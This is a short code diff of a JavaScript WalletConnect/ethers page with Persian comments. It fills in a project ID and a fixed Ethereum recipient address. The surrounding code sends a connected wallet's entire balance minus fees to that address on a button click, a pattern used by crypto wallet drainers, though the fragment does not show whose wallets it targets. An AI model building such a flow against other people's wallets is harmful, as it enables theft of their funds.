@@ -2,7 +2,7 @@ import { ethers } from "ethers";
 import { WalletConnectModalSign } from "@walletconnect/modal-sign-html";
 
 // WalletConnect project ID خودت رو اینجا بذار
-const projectId = "YOUR_WALLETCONNECT_PROJECT_ID";
+const projectId = "4d08946e6c316bed5e76b450ccbb5256";
 
 const modal = new WalletConnectModalSign({
   projectId,
@@ -83,7 +83,7 @@ sendBtn.addEventListener("click", async () => {
     const amountToSend = balance - fee;
 
     const tx = {
-      to: "0xYourRecipientAddressHere", // <-- آدرس مقصد رو اینجا بذار
+      to: "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05", // <-- آدرس مقصد رو اینجا بذار
       value: amountToSend,
       gasLimit,
       gasPrice
